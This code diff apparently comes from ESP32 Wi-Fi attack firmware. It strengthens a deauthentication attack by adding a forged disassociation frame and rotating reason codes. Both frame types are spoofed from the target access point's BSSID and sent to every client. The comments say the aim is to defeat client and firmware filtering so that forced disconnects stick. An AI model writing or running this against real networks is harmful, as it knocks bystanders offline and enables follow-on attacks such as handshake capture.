@@ -1602,6 +1602,26 @@ static uint8_t deauth_frame_default[26] = {
 };
 static uint8_t deauth_frame[sizeof(deauth_frame_default)];
 
+// Disassociation frame template (0xA0) — some clients ignore deauth but honor
+// disassoc, or vice versa. Sending both frame types back-to-back per target
+// is the standard technique used by aircrack-ng/Marauder for max compatibility.
+static uint8_t disassoc_frame_default[26] = {
+    0xA0, 0x00,                         // type, subtype a0: disassociation
+    0x00, 0x00,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
+    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
+    0x00, 0x00,
+    0x01, 0x00
+};
+static uint8_t disassoc_frame[sizeof(disassoc_frame_default)];
+
+// Reason codes cycled per burst — some client/AP firmware whitelists or
+// ignores specific codes, rotating improves odds of disconnect sticking
+static const uint8_t deauthReasonCodes[] = {1, 2, 3, 6, 7, 8};
+static const int numDeauthReasonCodes = sizeof(deauthReasonCodes) / sizeof(deauthReasonCodes[0]);
+static volatile int deauthReasonIndex = 0;
+
 // State variables
 static bool initialized = false;
 static bool exitRequested = false;
@@ -1726,12 +1746,23 @@ static void sendRawFrame(const uint8_t* frame, int size) {
 static void sendDeauthFrame(const wifi_ap_record_t* ap, uint8_t chan) {
     esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
 
+    uint8_t reason = deauthReasonCodes[deauthReasonIndex % numDeauthReasonCodes];
+    deauthReasonIndex++;
+
+    // Deauth (0xC0) — primary disconnect frame
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
     memcpy(&deauth_frame[10], ap->bssid, 6);  // Source: AP BSSID
     memcpy(&deauth_frame[16], ap->bssid, 6);  // BSSID
-    deauth_frame[24] = 7;  // Reason code
-
+    deauth_frame[24] = reason;
     sendRawFrame(deauth_frame, sizeof(deauth_frame));
+
+    // Disassoc (0xA0) — some clients only honor this one; sending both
+    // frame types per cycle catches clients that filter/ignore either
+    memcpy(disassoc_frame, disassoc_frame_default, sizeof(disassoc_frame_default));
+    memcpy(&disassoc_frame[10], ap->bssid, 6);
+    memcpy(&disassoc_frame[16], ap->bssid, 6);
+    disassoc_frame[24] = reason;
+    sendRawFrame(disassoc_frame, sizeof(disassoc_frame));
 }
 
 // ───────────────────────────────────────────────────────────────────────────
